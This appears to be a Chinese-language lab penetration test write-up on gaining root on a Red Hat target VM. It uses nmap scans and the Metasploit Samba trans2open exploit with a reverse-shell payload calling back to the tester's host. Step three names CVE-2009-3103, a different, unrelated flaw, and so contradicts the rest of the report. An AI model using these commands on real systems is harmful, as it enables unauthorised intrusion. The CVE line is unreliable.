# 渗透测试报告 - Samba漏洞利用获取Root权限

## 靶机信息

| 项目       | 详情                               |
| :------- | :------------------------------- |
| **目标IP** | 192.168.153.137                  |
| **操作系统** | Linux 2.4.9 - 2.4.18 (Red Hat)   |
| **开放端口** | 22, 80, 111, 139, 443, 1024      |
| **利用漏洞** | Samba trans2open (CVE-2003-0201) |

***

## 渗透过程

### 第一步：网络扫描发现靶机

```bash
nmap -sn 192.168.153.0/24
```

发现5台活动主机，确定靶机IP为 192.168.153.137

***

### 第二步：端口与服务扫描

```bash
nmap -sV 192.168.153.137
```

识别出靶机运行的服务：

- SSH (OpenSSH 2.9p2)
- HTTP (Apache 1.3.20)
- SMB (Samba smbd)
- SSL (mod\_ssl 2.8.4 + OpenSSL 0.9.6b)

***

### 第三步：漏洞扫描

```bash
nmap -p 139 --script=*smb* 192.168.153.137
```

确认靶机存在 **CVE-2009-3103** SMBv2漏洞

***

### 第四步：漏洞利用

使用Metasploit的Samba trans2open模块进行漏洞利用：

```bash
msfconsole
msf > use exploit/linux/samba/trans2open
msf6 exploit(linux/samba/trans2open) > set RHOSTS 192.168.153.137
msf6 exploit(linux/samba/trans2open) > set RPORT 139
msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
msf6 exploit(linux/samba/trans2open) > set LHOST 192.168.153.135
msf6 exploit(linux/samba/trans2open) > set LPORT 4444
msf6 exploit(linux/samba/trans2open) > exploit
```

***

### 第五步：获取Shell并确认权限

```bash
sessions 1
whoami
# 输出: root
```

***

## 漏洞详情

| 项目        | 详情                                      |
| :-------- | :-------------------------------------- |
| **漏洞名称**  | Samba trans2open Remote Buffer Overflow |
| **CVE编号** | CVE-2003-0201                           |
| **影响版本**  | Samba 2.2.x - 2.2.8                     |
| **严重程度**  | Critical (CVSS 10.0)                    |
| **利用方式**  | 通过发送畸形的trans2open SMB数据包触发缓冲区溢出         |
| **利用平台**  | Metasploit (linux/samba/trans2open)     |

***

## 渗透完成

- **初始访问**: ✅ 通过Samba trans2open漏洞获取shell
- **权限获取**: ✅ 成功获得root权限
- **目标达成**: 🎯 获取靶机最高权限

***

## 使用的工具

| 工具                       | 用途             |
| :----------------------- | :------------- |
| Nmap                     | 网络扫描、端口扫描、漏洞检测 |
| Metasploit Framework     | 漏洞利用框架         |
| nmap smb-vuln-\* scripts | SMB漏洞验证        |

***

<br />

